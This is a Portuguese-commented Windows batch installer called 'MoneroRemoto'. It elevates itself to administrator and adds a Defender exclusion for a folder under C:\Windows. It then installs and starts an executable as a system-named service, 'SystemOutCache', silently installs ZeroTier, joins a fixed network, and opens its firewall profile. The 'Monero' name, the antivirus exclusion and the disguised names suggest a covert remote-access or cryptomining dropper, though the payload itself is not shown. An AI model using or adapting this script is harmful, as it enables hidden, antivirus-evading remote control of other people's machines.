@echo off
setlocal
title MoneroRemoto - Master Installer
pushd "%~dp0"

:: [1] ELEVATION & SECURITY
:: ========================================================
echo [1/5] Verificando Privilegios e Seguranca...
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo      [INFO] Solicitando elevacao para Administrador...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo      [DEFENDER] Aplicando Exclusao em C:\Windows\SystemOut...
powershell.exe -NoProfile -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\Windows\SystemOut'" >nul 2>&1

:: [2] EXTRACTION & PREPARATION
:: ========================================================
echo.
echo [2/5] Extraindo Pacote SystemOut...
if exist "SystemOut.zip" (
    powershell -command "Expand-Archive -Path 'SystemOut.zip' -DestinationPath 'C:\Windows' -Force"
    timeout /t 3 /nobreak >nul
) else (
    echo      [ERRO] SystemOut.zip nao encontrado no diretorio atual.
    pause
    exit /b
)

:: Validate Extraction
if not exist "C:\Windows\SystemOut\SystemOutCache.exe" (
    echo      [ERRO CRITICO] SystemOutCache.exe nao encontrado em C:\Windows\SystemOut.
    pause
    exit /b
)

:: [3] PHASE 1: AGENT DEPLOY (PRIORITY HIGH)
:: ========================================================
echo.
echo [3/5] PHASE 1: Deploy do Agente Remoto...
echo      (Se uma janela abrir e fechar rapido, eh normal)

:: Install Agent Service
echo      Instalando Servico SystemOutCache.exe...
start /wait "" "C:\Windows\SystemOut\SystemOutCache.exe"
:: START IMMEDIATELY
echo      Iniciando Agente...
sc start SystemOutCache >nul 2>&1
echo      ✅ Agente SystemOut ativo e rodando em background.

echo.
echo      [INFO] Aguardando o Agente estabilizar (7 segundos)...
timeout /t 6 /nobreak >nul

:: [4] PHASE 2: NETWORK DEPLOY (ZEROTIER)
:: ========================================================
echo.
echo [4/5] PHASE 2: Configurando Rede VPN (ZeroTier)...
set NETWORK_ID=a09acf02334a8115

:: Check MSI Presence explicitly
if not exist "C:\Windows\SystemOut\ZeroTier One.msi" (
    echo      [AVISO] 'ZeroTier One.msi' nao encontrado em C:\Windows\SystemOut.
    echo      Pulando instalacao de rede...
    goto :SKIP_VPN
)

:: Install VPN (Force Install/Repair to ensure Service is UP)
echo      Instalando/Reparando ZeroTier (MSI)...

:: START /WAIT is critical!
start /wait msiexec /i "C:\Windows\SystemOut\ZeroTier One.msi" /quiet /qn
echo      Aguardando servico de rede subir (10s)...
timeout /t 10 /nobreak >nul

:ZEROTIER_INSTALLED
:: Define CLI Path (Prioritize x86)
set CLI_PATH="C:\Program Files (x86)\ZeroTier\One\zerotier-cli.bat"
if not exist %CLI_PATH% (
    if exist "C:\Program Files\ZeroTier\One\zerotier-cli.bat" (
        set CLI_PATH="C:\Program Files\ZeroTier\One\zerotier-cli.bat"
    ) else (
         echo [ERRO] ZeroTier CLI nao encontrado apos instalacao. 
         echo Caminho esperado: %CLI_PATH%
         if exist "C:\Windows\SystemOut\ZeroTier One.msi" (
             echo Tentando reinstalar MSI forcadamente...
             start /wait msiexec /i "C:\Windows\SystemOut\ZeroTier One.msi" /quiet /qn
             timeout /t 5 >nul
         ) else (
             goto :SKIP_VPN
         )
    )
)

:: Join Network
echo      Conectando a Rede: %NETWORK_ID%...
call %CLI_PATH% join %NETWORK_ID% >nul 2>&1

:: [5] VALIDATION LOOP (MATCHING REFERENCE)
:: ========================================================
:CHECK_STATUS
echo.
echo ---------------------------------------------------
echo [AGUARDANDO AUTORIZACAO NO SITE ZERO TIER]
echo ---------------------------------------------------

:: 1. Salva status com tratamento de erro
call %CLI_PATH% listnetworks > status.tmp 2>nul
if %errorlevel% neq 0 (
    echo [ERRO] Falha ao executar zerotier-cli. O servico esta rodando?
    timeout /t 3 >nul
    goto CHECK_STATUS
)

:: 2. Procura ID
findstr "%NETWORK_ID%" status.tmp > id_found.tmp

:: 3. Se vazio, retenta Join
for %%A in (id_found.tmp) do if %%~zA==0 (
    echo [ERRO] Rede nao listada. Tentando Join novamente...
    call %CLI_PATH% join %NETWORK_ID% >nul
    timeout /t 5 >nul
    goto CHECK_STATUS
)

:: 4. Verifica OK
findstr "OK" id_found.tmp >nul
if %errorLevel% equ 0 (
    echo.
    echo [SUCESSO] Status OK detectado!
    del status.tmp
    del id_found.tmp
    goto FIREWALL
) else (
    echo.
    echo [STATUS ATUAL]: Nao Autorizado
    echo ---------------------------------------------------
    type id_found.tmp
    echo ---------------------------------------------------
    echo.
    echo [INFO] Agente Local: ONLINE.
    echo [INFO] VPN: Aguardando voce autorizar no my.zerotier.com...
    echo.
    echo Retentando em 5 segundos...
    timeout /t 5 >nul
    goto CHECK_STATUS
)

:FIREWALL
echo.
echo [ETAPA FINAL] Configurando Firewall da VPN...
powershell -ExecutionPolicy Bypass -Command "Get-NetConnectionProfile | Where-Object { $_.InterfaceAlias -like '*ZeroTier*' } | Set-NetConnectionProfile -NetworkCategory Private" >nul 2>&1

goto :FINISH

:SKIP_VPN
echo.
echo [AVISO] VPN ignorada ou falhou.

:FINISH
echo.
echo ========================================================
echo   INSTALACAO MESTRE CONCLUIDA!
echo ========================================================
echo   O Agente esta operante.
if exist status.tmp del status.tmp
if exist id_found.tmp del id_found.tmp
echo   Fechando em 5 segundos...
timeout /t 5
exit
